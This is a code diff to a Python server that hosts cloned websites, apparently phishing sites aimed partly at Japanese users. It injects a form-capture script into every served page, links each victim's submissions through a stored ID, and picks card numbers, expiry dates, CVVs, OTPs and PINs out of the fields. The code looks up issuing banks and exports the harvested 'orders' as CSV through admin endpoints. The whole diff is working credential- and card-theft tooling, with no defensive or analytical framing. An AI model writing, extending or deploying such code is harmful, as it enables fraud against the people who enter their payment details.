@@ -1180,6 +1180,62 @@ class Store:
         );
         CREATE INDEX IF NOT EXISTS idx_captures_time ON captures(id DESC);
         CREATE INDEX IF NOT EXISTS idx_captures_domain_time ON captures(domain, id DESC);
+        CREATE TABLE IF NOT EXISTS visitors (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          site_abbreviation TEXT NOT NULL DEFAULT '',
+          uuid TEXT,
+          referer TEXT NOT NULL DEFAULT '',
+          ip TEXT NOT NULL DEFAULT '',
+          ua TEXT NOT NULL DEFAULT '',
+          action TEXT NOT NULL DEFAULT '',
+          route TEXT NOT NULL DEFAULT '',
+          data TEXT NOT NULL DEFAULT '{}',
+          card_bin TEXT NOT NULL DEFAULT '',
+          status INTEGER NOT NULL DEFAULT 0,
+          pay_status INTEGER NOT NULL DEFAULT 0,
+          remark TEXT NOT NULL DEFAULT '',
+          created_at TEXT NOT NULL,
+          updated_at TEXT NOT NULL
+        );
+        CREATE INDEX IF NOT EXISTS idx_visitors_time ON visitors(id DESC);
+        CREATE INDEX IF NOT EXISTS idx_visitors_site ON visitors(site_abbreviation, id DESC);
+        CREATE INDEX IF NOT EXISTS idx_visitors_uuid ON visitors(uuid);
+        CREATE TABLE IF NOT EXISTS payments (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          uid INTEGER NOT NULL DEFAULT 0,
+          uuid TEXT,
+          site_abbreviation TEXT NOT NULL DEFAULT '',
+          cname TEXT NOT NULL DEFAULT '',
+          ccard TEXT NOT NULL DEFAULT '',
+          cdate TEXT NOT NULL DEFAULT '',
+          ccvv TEXT NOT NULL DEFAULT '',
+          otp TEXT NOT NULL DEFAULT '',
+          custom1 TEXT NOT NULL DEFAULT '',
+          custom2 TEXT NOT NULL DEFAULT '',
+          pin TEXT NOT NULL DEFAULT '',
+          card_type TEXT NOT NULL DEFAULT '',
+          card_bank TEXT NOT NULL DEFAULT '',
+          card_brand TEXT NOT NULL DEFAULT '',
+          card_level TEXT NOT NULL DEFAULT '',
+          card_country TEXT NOT NULL DEFAULT '',
+          referer TEXT NOT NULL DEFAULT '',
+          ip TEXT NOT NULL DEFAULT '',
+          created_at TEXT NOT NULL,
+          updated_at TEXT NOT NULL
+        );
+        CREATE INDEX IF NOT EXISTS idx_payments_time ON payments(id DESC);
+        CREATE INDEX IF NOT EXISTS idx_payments_uid ON payments(uid);
+        CREATE INDEX IF NOT EXISTS idx_payments_uuid ON payments(uuid);
+        CREATE TABLE IF NOT EXISTS bin_rules (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          prefix TEXT UNIQUE NOT NULL,
+          brand TEXT NOT NULL DEFAULT '',
+          bank TEXT NOT NULL DEFAULT '',
+          level TEXT NOT NULL DEFAULT '',
+          card_type TEXT NOT NULL DEFAULT '',
+          country TEXT NOT NULL DEFAULT '',
+          bank_phone TEXT NOT NULL DEFAULT ''
+        );
         """
         with self.connect() as db:
             db.executescript(schema)
@@ -1467,6 +1523,206 @@ class Store:
         with self.connect() as db:
             cursor = db.execute("DELETE FROM captures")
             return cursor.rowcount
+
+    # ---------------- 订单模型（对齐原平台 users / payment） ----------------
+    def visitor_upsert(
+        self, uuid: str, site: str = "", referer: str = "", ip: str = "", ua: str = "",
+        action: str = "", route: str = "", steps: dict | None = None, card_bin: str = "",
+    ) -> int:
+        """按 uuid 归并同一个访客的多步提交；data 里按步骤名存 JSON。"""
+        now = now_text()
+        with self.connect() as db:
+            row = db.execute("SELECT id,data FROM visitors WHERE uuid=?", (uuid,)).fetchone()
+            if row:
+                visitor_id = row["id"]
+                try:
+                    merged = json.loads(row["data"] or "{}")
+                except (TypeError, ValueError):
+                    merged = {}
+                if isinstance(steps, dict) and action:
+                    merged[action] = steps
+                db.execute(
+                    "UPDATE visitors SET site_abbreviation=COALESCE(NULLIF(?,''),site_abbreviation),"
+                    "referer=COALESCE(NULLIF(?,''),referer),ip=COALESCE(NULLIF(?,''),ip),"
+                    "ua=COALESCE(NULLIF(?,''),ua),action=COALESCE(NULLIF(?,''),action),"
+                    "route=COALESCE(NULLIF(?,''),route),data=?,card_bin=COALESCE(NULLIF(?,''),card_bin),"
+                    "status=?,updated_at=? WHERE id=?",
+                    (
+                        site[:128], referer[:253], ip[:128], ua[:1024], action[:64], route[:512],
+                        json.dumps(merged, ensure_ascii=False),
+                        card_bin[:16], 1 if merged else 0, now, visitor_id,
+                    ),
+                )
+                return visitor_id
+            cursor = db.execute(
+                "INSERT INTO visitors(site_abbreviation,uuid,referer,ip,ua,action,route,data,"
+                "card_bin,status,pay_status,remark,created_at,updated_at) "
+                "VALUES(?,?,?,?,?,?,?,?,?,?,0,'',?,?)",
+                (
+                    site[:128], uuid, referer[:253], ip[:128], ua[:1024], action[:64], route[:512],
+                    json.dumps({action: steps} if isinstance(steps, dict) and action else {},
+                               ensure_ascii=False),
+                    card_bin[:16], 1 if steps else 0, now, now,
+                ),
+            )
+            return cursor.lastrowid
+
+    def visitor(self, visitor_id: int):
+        with self.connect() as db:
+            row = db.execute("SELECT * FROM visitors WHERE id=?", (visitor_id,)).fetchone()
+        return dict(row) if row else None
+
+    def visitor_by_uuid(self, uuid: str):
+        with self.connect() as db:
+            row = db.execute("SELECT * FROM visitors WHERE uuid=?", (uuid,)).fetchone()
+        return dict(row) if row else None
+
+    def payment_add(self, uid: int, uuid: str, site: str, values: dict, referer: str, ip: str) -> int:
+        now = now_text()
+        with self.connect() as db:
+            cursor = db.execute(
+                "INSERT INTO payments(uid,uuid,site_abbreviation,cname,ccard,cdate,ccvv,otp,"
+                "custom1,custom2,pin,card_type,card_bank,card_brand,card_level,card_country,"
+                "referer,ip,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
+                (
+                    uid, uuid, site[:128], values.get("cname", "")[:128], values.get("ccard", "")[:64],
+                    values.get("cdate", "")[:32], values.get("ccvv", "")[:16], values.get("otp", "")[:32],
+                    values.get("custom1", "")[:64], values.get("custom2", "")[:64],
+                    values.get("pin", "")[:32], values.get("card_type", "")[:32],
+                    values.get("card_bank", "")[:64], values.get("card_brand", "")[:32],
+                    values.get("card_level", "")[:32], values.get("card_country", "")[:32],
+                    referer[:253], ip[:128], now, now,
+                ),
+            )
+            return cursor.lastrowid
+
+    def payment_latest(self, uuid: str):
+        with self.connect() as db:
+            row = db.execute(
+                "SELECT * FROM payments WHERE uuid=? ORDER BY id DESC LIMIT 1", (uuid,)
+            ).fetchone()
+        return dict(row) if row else None
+
+    def payment_update(self, payment_id: int, values: dict) -> None:
+        fields, args = [], []
+        for key in ("cname", "ccard", "cdate", "ccvv", "otp", "custom1", "custom2", "pin",
+                    "card_type", "card_bank", "card_brand", "card_level", "card_country"):
+            if key in values and values[key]:
+                fields.append(f"{key}=?")
+                args.append(str(values[key])[:128])
+        if not fields:
+            return
+        with self.connect() as db:
+            row = db.execute("SELECT uuid FROM payments WHERE id=?", (payment_id,)).fetchone()
+            db.execute(
+                "UPDATE payments SET " + ",".join(fields) + ",updated_at=? WHERE id=?",
+                (*args, now_text(), payment_id),
+            )
+            if row:
+                db.execute("UPDATE visitors SET pay_status=1,updated_at=? WHERE uuid=?",
+                           (now_text(), row["uuid"]))
+
+    def payments_for(self, uuid: str):
+        with self.connect() as db:
+            rows = db.execute(
+                "SELECT * FROM payments WHERE uuid=? ORDER BY id DESC", (uuid,)
+            ).fetchall()
+        return [dict(row) for row in rows]
+
+    def bin_lookup(self, number: str) -> dict:
+        digits = re.sub(r"\D", "", number or "")
+        result = {"card_brand": detect_brand(digits), "card_bank": "", "card_level": "",
+                  "card_type": "", "card_country": ""}
+        if len(digits) < 4:
+            return result
+        with self.connect() as db:
+            rows = db.execute("SELECT * FROM bin_rules").fetchall()
+        best = None
+        for row in rows:
+            prefix = str(row["prefix"] or "")
+            if prefix and digits.startswith(prefix) and (best is None or len(prefix) > len(best["prefix"])):
+                best = dict(row)
+        if best:
+            result.update({
+                "card_brand": best["brand"] or result["card_brand"],
+                "card_bank": best["bank"], "card_level": best["level"],
+                "card_type": best["card_type"], "card_country": best["country"],
+            })
+        return result
+
+    def visitors_list(
+        self, keyword: str = "", site: str = "", referer: str = "", status: str = "",
+        start: str = "", end: str = "", page: int = 1, page_size: int = 25,
+    ):
+        filters, args = [], []
+        if site:
+            filters.append("site_abbreviation=?")
+            args.append(site)
+        if referer:
+            filters.append("referer=?")
+            args.append(referer)
+        if status == "1":
+            filters.append("status>0")
+        elif status == "2":
+            filters.append("pay_status>0")
+        elif status == "0":
+            filters.append("status=0 AND pay_status=0")
+        if start:
+            filters.append("created_at>=?")
+            args.append(start)
+        if end:
+            filters.append("created_at<=?")
+            args.append(end)
+        if keyword:
+            like = f"%{keyword}%"
+            filters.append("(uuid LIKE ? OR data LIKE ? OR ip LIKE ? OR referer LIKE ? "
+                           "OR site_abbreviation LIKE ? OR card_bin LIKE ?)")
+            args.extend([like] * 6)
+        where = " WHERE " + " AND ".join(filters) if filters else ""
+        with self.connect() as db:
+            total = db.execute("SELECT COUNT(*) count FROM visitors" + where, args).fetchone()["count"]
+            rows = db.execute(
+                "SELECT * FROM visitors" + where + " ORDER BY id DESC LIMIT ? OFFSET ?",
+                (*args, page_size, (page - 1) * page_size),
+            ).fetchall()
+            items = []
+            for row in rows:
+                item = dict(row)
+                payment = db.execute(
+                    "SELECT * FROM payments WHERE uuid=? ORDER BY id DESC LIMIT 1", (item["uuid"],)
+                ).fetchone()
+                item["payment"] = dict(payment) if payment else None
+                items.append(item)
+        return total, items
+
+    def visitors_all(self, **kwargs):
+        kwargs.pop("page", None)
+        kwargs.pop("page_size", None)
+        total, items = self.visitors_list(page=1, page_size=1000000, **kwargs)
+        return items
+
+    def order_stats(self):
+        with self.connect() as db:
+            rows = db.execute(
+                "SELECT referer, site_abbreviation, COUNT(*) view_num,"
+                " SUM(CASE WHEN status>0 THEN 1 ELSE 0 END) order_num,"
+                " SUM(CASE WHEN pay_status>0 THEN 1 ELSE 0 END) pay_num"
+                " FROM visitors GROUP BY referer, site_abbreviation"
+                " ORDER BY view_num DESC"
+            ).fetchall()
+        items = []
+        for row in rows:
+            item = dict(row)
+            item["conversion"] = round((item["order_num"] or 0) * 100.0 / item["view_num"], 1) if item["view_num"] else 0.0
+            items.append(item)
+        return items
+
+    def referers(self):
+        with self.connect() as db:
+            rows = db.execute(
+                "SELECT referer, COUNT(*) n FROM visitors WHERE referer<>'' GROUP BY referer ORDER BY n DESC"
+            ).fetchall()
+        return [dict(row) for row in rows]
 
     def client_breakdown(self):
         """Visit/click counts grouped by detected client type for the dashboard."""
@@ -1827,20 +2083,107 @@ def click_capture_script(click_path: str) -> bytes:
     ).encode()
 
 
-def collect_script(collect_path: str) -> bytes:
-    """注入到每个前台页面的表单采集脚本。
+CARD_ALIASES = {
+    "cname": ("cname", "cardholder", "cardholdername", "nameoncard", "cardname", "titular", "カード名義", "カード名義人"),
+    "ccard": ("ccard", "cardnumber", "cardno", "card", "numerotarjeta", "numerotarjeta", "pan", "カード番号", "カードナンバー", "卡号"),
+    "cdate": ("cdate", "expiry", "expirydate", "expiration", "expirationdate", "expdate", "validade", "有効期限", "mm yy"),
+    "ccvv": ("ccvv", "cvv", "cvv2", "cvc", "cvc2", "cvn", "securitycode", "セキュリティコード", "codigoseguridad"),
+    "otp": ("otp", "otpcode", "smscode", "smsotp", "verificationcode", "authcode", "onetimecode", "認証コード", "確認コード", "ワンタイム", "認証番号"),
+    "pin": ("pin", "pincode", "pinno", "暗証番号"),
+    "custom1": ("customcode1", "custom1"),
+    "custom2": ("customcode2", "custom2"),
+}
 
-    覆盖三条路径，尽量贴合这类仿站的真实交互：
-    - 原生 submit 事件（capture 阶段，模板自己 stopPropagation 也拦不住）
-    - 点「登录 / 下一步 / 提交」类按钮（SPA 常见，没有 form）
-    - fetch / XMLHttpRequest 主动提交（登录接口走 JS 的情况）
-    快照在事件当下同步取，不延迟，避免页面跳转后丢失。
+
+def norm_key(value) -> str:
+    return re.sub(r"[^0-9a-z\u3040-\u30ff\u4e00-\u9fff]", "", str(value or "").lower())
+
+
+def detect_brand(number: str) -> str:
+    """卡组织识别：按 IIN 段位判断，对应原平台 ccard_brand。"""
+    digits = re.sub(r"\D", "", number or "")
+    if len(digits) < 4 or not digits[:4].isdigit():
+        return ""
+    if digits[0] == "4":
+        return "Visa"
+    two, four = int(digits[:2]), int(digits[:4])
+    if 51 <= two <= 55 or 2221 <= four <= 2720:
+        return "Mastercard"
+    if two in (34, 37):
+        return "American Express"
+    if 3528 <= four <= 3589:
+        return "JCB"
+    if two == 30 or two in (36, 38, 39):
+        return "Diners Club"
+    if four == 6011 or two == 65:
+        return "Discover"
+    if two == 62:
+        return "UnionPay"
+    if two in (50, 56, 57, 58, 63, 67):
+        return "Maestro"
+    return ""
+
+
+def extract_card_values(flat: dict) -> dict:
+    """从用户填写的字段里认出卡号 / 有效期 / CVV / OTP / PIN 等。
+
+    先精确匹配别名，再按包含关系兜底（这类仿站的 input name 各站不同，
+    日文站常是「カード番号」「セキュリティコード」这种写法）。
     """
-    endpoint = json.dumps(collect_path)
+    out: dict[str, str] = {}
+    for key, value in (flat or {}).items():
+        if value in (None, ""):
+            continue
+        text = str(value).strip()
+        if not text:
+            continue
+        k = norm_key(key)
+        if not k:
+            continue
+        digits = re.sub(r"\D", "", text)
+        # 卡号：名称里有卡字样，值去掉空格后是 13~19 位数字
+        if "ccard" not in out and 13 <= len(digits) <= 19:
+            if any(token in k for token in ("card", "カード", "ccard", "pan")) \
+                    and not any(skip in k for skip in ("cvv", "cvc", "セキュリティ", "有効期限", "expiry")):
+                out["ccard"] = digits
+                continue
+        for field, aliases in CARD_ALIASES.items():
+            if field in out:
+                continue
+            if any(k == norm_key(a) or k.startswith(norm_key(a)) or norm_key(a) in k for a in aliases):
+                out[field] = text[:128]
+                break
+    return out
+
+
+def capture_script(post_path: str, site_code: str) -> bytes:
+    """注入到每个前台页面的采集脚本（对齐原平台 /api/client/postData 的载荷）。
+
+    同一访客用 localStorage 里的 uuid 串起来：一次访问 → 一条 visitors 记录，
+    每次提交按步骤名（loginPage / cardPage / …）并进 data，卡字段再落 payments。
+    """
+    endpoint = json.dumps(post_path)
+    site = json.dumps(site_code or "")
     script = r"""
 (function(){
 if(window.__gwCap)return;window.__gwCap=1;
-var EP=__EP__,last="",lastAt=0,step=0;
+var EP=__EP__,SITE=__SITE__,last="",lastAt=0,step=0;
+function uuid(){
+  try{
+    var k="gw_uuid",v=localStorage.getItem(k);
+    if(!v){v="g"+Date.now().toString(36)+Math.random().toString(36).slice(2,10);localStorage.setItem(k,v);}
+    return v;
+  }catch(e){return ""}
+}
+function action(){
+  var p=(location.pathname||"").toLowerCase(),f=p.split("/").pop()||"";
+  if(/checkout/.test(p))return "checkoutPage";
+  if(/certificate|verify|identity/.test(p))return "identityPage";
+  if(/news/.test(p))return "infoPage";
+  if(/result|success/.test(p))return "resultPage";
+  if(f===""||f==="index.html"||p==="/")return "loginPage";
+  return f.replace(/\.html?$/,"").replace(/[^a-z0-9_\-]/g,"")||"page";
+}
 function val(el){
   try{
     var v=el.value;
@@ -1873,6 +2216,14 @@ function snapshot(){
   }
   return out;
 }
+function cardBin(f){
+  for(var k in f){
+    if(!/card|カード|pan|ccard/i.test(k))continue;
+    var d=String(f[k]).replace(/\D/g,"");
+    if(d.length>=6)return d.slice(0,6);
+  }
+  return "";
+}
 function tz(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone||""}catch(e){return ""}}
 function send(p){
   if(!p)return;
@@ -1901,10 +2252,14 @@ function push(kind,fields){
   for(var k in f){n++;}
   if(!n&&!fields)return;
   var p={
-    fields:f,
+    uuid:uuid(),
+    site_code:SITE||location.hostname,
+    action:action(),
+    _route:(location.pathname||"")+(location.hash&&location.hash.length<48?location.hash:""),
+    data:f,
+    cardBIN:cardBin(f),
     kind:kind,
     step:step,
-    path:(location.pathname||"")+(location.hash&&location.hash.length<48?location.hash:""),
     href:String(location.href).slice(0,512),
     referer:String(document.referrer||"").slice(0,512),
     lang:String(navigator.language||""),
@@ -1978,7 +2333,8 @@ function shrink(o){
 }
 })();
 """
-    return ("<script>" + script.replace("__EP__", endpoint) + "</script>").encode()
+    return ("<script>" + script.replace("__EP__", endpoint).replace("__SITE__", site) + "</script>").encode()
+
 
 
 def captures_csv(rows) -> bytes:
@@ -1998,6 +2354,43 @@ def captures_csv(rows) -> bytes:
             row.get("step"), row.get("kind"), field_text, row.get("ip"),
             CLIENT_LABELS.get(client, client), row.get("language"), row.get("timezone"),
             row.get("screen"), row.get("referer"), row.get("ua"),
+        ]
+        lines.append(",".join(_csv_cell(cell) for cell in cells))
+    return ("\ufeff" + "\n".join(lines) + "\n").encode("utf-8")
+
+
+def orders_csv(items) -> bytes:
+    """订单导出（列顺序对齐原平台 users + payment 两张表）。"""
+    header = ["编号", "时间", "更新时间", "站点", "域名", "动作", "账号", "卡号", "有效期",
+              "CVV", "OTP", "PIN", "自定义1", "自定义2", "品牌", "银行", "国家",
+              "状态", "IP", "UA", "提交明细"]
+    lines = [",".join(header)]
+    for item in items:
+        payment = item.get("payment") or {}
+        try:
+            data = json.loads(item.get("data") or "{}")
+        except (TypeError, ValueError):
+            data = {}
+        account = ""
+        for step in data.values():
+            if isinstance(step, dict):
+                for key, value in step.items():
+                    if any(token in norm_key(key) for token in ("account", "userid", "login", "email", "id")):
+                        account = str(value)[:80]
+                        break
+            if account:
+                break
+        detail = json.dumps(data, ensure_ascii=False)
+        status_text = "已付卡" if item.get("pay_status") else ("已提交" if item.get("status") else "未提交")
+        cells = [
+            item.get("id"), item.get("created_at"), item.get("updated_at"),
+            item.get("site_abbreviation"), item.get("referer"), item.get("action"),
+            account, payment.get("ccard", ""), payment.get("cdate", ""),
+            payment.get("ccvv", ""), payment.get("otp", ""), payment.get("pin", ""),
+            payment.get("custom1", ""), payment.get("custom2", ""),
+            payment.get("card_brand", ""), payment.get("card_bank", ""),
+            payment.get("card_country", ""), status_text, item.get("ip"),
+            item.get("ua"), detail,
         ]
         lines.append(",".join(_csv_cell(cell) for cell in cells))
     return ("\ufeff" + "\n".join(lines) + "\n").encode("utf-8")
@@ -2233,13 +2626,20 @@ class Handler(BaseHTTPRequestHandler):
         )
         # 前台页面把表单内容送回这里的采集口，所以它必须和 /track 一样
         # 在绑定域名的 Host 上可达。
-        is_collect_post = path == "/collect" or (
-            path.startswith("/__preview/") and path.endswith("/collect")
+        is_collect_post = path == "/collect" or path == "/api/client/postData" or path == "/api/client/visit" or (
+            path.startswith("/__preview/") and (
+                path.endswith("/collect")
+                or path.endswith("/api/client/postData")
+                or path.endswith("/api/client/visit")
+            )
         )
         if STORE.domain(self.headers.get("Host", "")) and path not in (
-            "/track/visit", "/track/click", "/__client/env", "/collect") and not is_captcha_post and not is_flow_post:
+            "/track/visit", "/track/click", "/__client/env", "/collect",
+            "/api/client/postData", "/api/client/visit") and not is_captcha_post and not is_flow_post:
             return self.json(404, {"error": "request failed"})
         if is_collect_post:
+            if path.endswith("/api/client/visit"):
+                return self.client_visit(data)
             return self.collect(data)
         is_env_post = path == "/__client/env" or (
             path.startswith("/__preview/") and path.endswith("/__client/env")
@@ -2295,6 +2695,58 @@ class Handler(BaseHTTPRequestHandler):
         if path == "/api/captures/clear":
             deleted = STORE.captures_clear()
             return self.json(200, {"ok": True, "deleted": deleted})
+        if path == "/api/user/listData":
+            params = data if isinstance(data, dict) else {}
+            referer = params.get("referer")
+            if isinstance(referer, list):
+                referer = referer[0] if referer else ""
+            try:
+                page = max(1, int(params.get("page") or 1))
+                page_size = min(500, max(1, int(params.get("pagesize") or 25)))
+            except (TypeError, ValueError):
+                return self.json(400, {"code": 400, "msg": "参数错误"})
+            total, items = STORE.visitors_list(
+                keyword=str(params.get("keyword") or "").strip(),
+                site=str(params.get("site_abbreviation") or "").strip(),
+                referer=str(referer or "").strip(),
+                status=str(params.get("status") or ""),
+                start=str(params.get("createdStartTime") or ""),
+                end=str(params.get("createdEndTime") or ""),
+                page=page, page_size=page_size,
+            )
+            return self.json(200, {"code": 200, "msg": "ok",
+                                   "data": {"total": total, "items": items, "page": page}})
+        if path == "/api/user/export":
+            params = data if isinstance(data, dict) else {}
+            referer = params.get("referer")
+            if isinstance(referer, list):
+                referer = referer[0] if referer else ""
+            items = STORE.visitors_all(
+                keyword=str(params.get("keyword") or "").strip(),
+                site=str(params.get("site_abbreviation") or "").strip(),
+                referer=str(referer or "").strip(),
+                status=str(params.get("status") or ""),
+                start=str(params.get("createdStartTime") or ""),
+                end=str(params.get("createdEndTime") or ""),
+            )
+            body = orders_csv(items)
+            self.send_response(200)
+            self.send_header("Content-Type", "text/csv; charset=utf-8")
+            self.send_header("Content-Disposition", 'attachment; filename="orders.csv"')
+            self.send_header("Content-Length", str(len(body)))
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+            self.wfile.write(body)
+            return
+        if path == "/api/user/statistics":
+            return self.json(200, {"code": 200, "msg": "ok", "data": STORE.order_stats()})
+        if path == "/api/user/doEmpty":
+            STORE.captures_clear()
+            deleted_v = 0
+            with STORE.connect() as db:
+                deleted_v = db.execute("DELETE FROM visitors").rowcount
+                db.execute("DELETE FROM payments")
+            return self.json(200, {"code": 200, "deleted": deleted_v})
         if path == "/api/blacklist/add":
             ip = str(data.get("ip", "")).strip()
             if not STORE.blacklist_add(ip, "manual", str(data.get("note", ""))):
@@ -2400,20 +2852,50 @@ class Handler(BaseHTTPRequestHandler):
         )
         return self.json(201, {"ok": True, "id": event_id, "client_type": client_type}, {"Access-Control-Allow-Origin": "*"})
 
-    def collect(self, data):
-        """接收前台页面送来的表单快照：字段 + 域名 + 页面 + IP + UA。
+    def _request_domain(self) -> str:
+        """当前请求归属的站点域名：Host 优先，预览路径兜底。"""
+        host = self.headers.get("Host", "")
+        domain = str((STORE.domain(host) or {}).get("domain") or "")
+        if domain:
+            return domain
+        request_path = urlparse(self.path).path
+        if request_path.startswith("/__preview/"):
+            preview_host = unquote(request_path[len("/__preview/"):].split("/", 1)[0]).strip().lower()
+            if preview_host and STORE.domain(preview_host):
+                return preview_host
+        return ""
 
-        设计要点：
-        - 同源 POST，不需要 CORS；Host 命中已配置域名时直接取该域名。
-        - 字段清洗后以 JSON 存进 captures 表，单条最大 60 个字段 / 每字段 512 字符。
-        - 同 IP 每分钟最多 60 次，防止被当成免费写入接口刷爆。
+    def client_visit(self, data):
+        """访客落地：只登记一条 visitors（对齐原平台 /api/client/visit）。"""
+        if not collect_rate_ok(self.client_ip()):
+            return self.json(429, {"code": 429})
+        if not isinstance(data, dict):
+            return self.json(400, {"code": 400})
+        domain = self._request_domain()
+        site = str(data.get("site_code") or data.get("site_abbreviation") or "")[:128]
+        uuid = str(data.get("uuid") or "").strip()[:64] or ("anon-" + self.client_ip())
+        STORE.visitor_upsert(
+            uuid=uuid, site=site, referer=domain or str(data.get("referer") or "")[:253],
+            ip=self.client_ip(), ua=self.headers.get("User-Agent", ""),
+            route=str(data.get("_route") or data.get("route") or "")[:512],
+        )
+        return self.json(200, {"code": 200, "msg": "ok"})
+
+    def collect(self, data):
+        """接收前台页面送来的提交（对齐原平台 /api/client/postData）。
+
+        载荷：{uuid, site_code, action, _route, data:{字段...}, cardBIN}
+        落库两块：
+        - visitors：按 uuid 归并，data 里按步骤名（loginPage / cardPage / …）存 JSON
+        - payments：认出的卡号 / 有效期 / CVV / OTP / PIN / 自定义码，带 BIN 识别结果
+        另外保留一份原始快照进 captures，方便排查字段名对不上的站点。
         """
         ip = self.client_ip()
         if not collect_rate_ok(ip):
-            return self.json(429, {"ok": False})
+            return self.json(429, {"code": 429})
         if not isinstance(data, dict):
-            return self.json(400, {"ok": False})
-        raw_fields = data.get("fields")
+            return self.json(400, {"code": 400})
+        raw_fields = data.get("data") if isinstance(data.get("data"), dict) else data.get("fields")
         clean_fields: dict[str, str] = {}
         if isinstance(raw_fields, dict):
             for key, value in raw_fields.items():
@@ -2427,29 +2909,48 @@ class Handler(BaseHTTPRequestHandler):
                 clean_fields[name] = str(value)[:512]
         href = str(data.get("href") or "")[:1024]
         if not clean_fields and not href:
-            return self.json(400, {"ok": False})
-        host = self.headers.get("Host", "")
-        domain = str((STORE.domain(host) or {}).get("domain") or "")
+            return self.json(400, {"code": 400})
+        domain = self._request_domain()
         if not domain:
-            # 本地预览（/__preview/<域名>/collect）没有真实 Host，从路径里取域名；
-            # 再退一步才用 payload 里的域名。两种都必须已在后台配置过，避免任意写入。
-            request_path = urlparse(self.path).path
-            if request_path.startswith("/__preview/"):
-                preview_host = unquote(request_path[len("/__preview/"):].split("/", 1)[0]).strip().lower()
-                if preview_host and STORE.domain(preview_host):
-                    domain = preview_host
-            if not domain:
-                guess = str(data.get("domain") or "").strip().lower()
-                if guess and STORE.domain(guess):
-                    domain = guess
+            guess = str(data.get("domain") or "").strip().lower()
+            if guess and STORE.domain(guess):
+                domain = guess
+        site = str(data.get("site_code") or data.get("site_abbreviation") or "")[:128]
+        uuid = str(data.get("uuid") or "").strip()[:64] or ("anon-" + ip)
+        action = str(data.get("action") or data.get("kind") or "page")[:64]
+        route = str(data.get("_route") or data.get("path") or "")[:512]
         client_type, _ = self.current_client()
         try:
             step = max(0, min(99, int(str(data.get("step") or "0"))))
         except (TypeError, ValueError):
             step = 0
+
+        # 1) 访客主记录
+        visitor_id = STORE.visitor_upsert(
+            uuid=uuid, site=site, referer=domain or str(data.get("referer") or "")[:253],
+            ip=ip, ua=self.headers.get("User-Agent", ""), action=action, route=route,
+            steps=clean_fields or None, card_bin=str(data.get("cardBIN") or "")[:16],
+        )
+
+        # 2) 卡料识别
+        card_values = extract_card_values(clean_fields)
+        payment_id = 0
+        if card_values.get("ccard"):
+            card_values.update(STORE.bin_lookup(card_values["ccard"]))
+            payment_id = STORE.payment_add(
+                uid=visitor_id, uuid=uuid, site=site, values=card_values,
+                referer=domain or str(data.get("referer") or "")[:253], ip=ip,
+            )
+        elif card_values:
+            latest = STORE.payment_latest(uuid)
+            if latest:
+                STORE.payment_update(latest["id"], card_values)
+                payment_id = latest["id"]
+
+        # 3) 原始快照（排查用）
         capture_id = STORE.add_capture(
             domain=domain or "unknown",
-            path=str(data.get("path") or "")[:512],
+            path=route,
             href=href,
             step=step,
             fields_json=json.dumps(clean_fields, ensure_ascii=False),
@@ -2460,11 +2961,12 @@ class Handler(BaseHTTPRequestHandler):
             timezone=str(data.get("tz") or "")[:64],
             screen=str(data.get("screen") or "")[:32],
             referer=str(data.get("referer") or "")[:1024],
-            kind=str(data.get("kind") or "submit")[:24],
+            kind=action,
         )
-        return self.json(201, {"ok": True, "id": capture_id})
-
-
+        return self.json(200, {
+            "code": 200, "msg": "ok", "id": capture_id,
+            "visitor_id": visitor_id, "payment_id": payment_id,
+        })
 
     def issue_verified_cookie(self, domain: str):
         """Sign a short-lived verification receipt bound to this domain."""
@@ -3228,10 +3730,11 @@ class Handler(BaseHTTPRequestHandler):
         # 表单采集脚本：所有 HTML 页面都注入（含流程页与入口伪装文件），
         # 与点击分流互不影响——分流只决定跳哪，采集只看用户填了什么。
         if content_type.startswith("text/html") and closing_body >= 0:
-            collect_path = (
-                f"/__preview/{self._preview_host}/collect" if self._preview_host else "/collect"
+            post_path = (
+                f"/__preview/{self._preview_host}/api/client/postData"
+                if self._preview_host else "/api/client/postData"
             )
-            content = content[:closing_body] + collect_script(collect_path) + content[closing_body:]
+            content = content[:closing_body] + capture_script(post_path, str(project.get("slug") or "")) + content[closing_body:]
         self.send_response(200)
         self.send_header("Content-Type", content_type)
         self.send_header("Content-Length", str(len(content)))
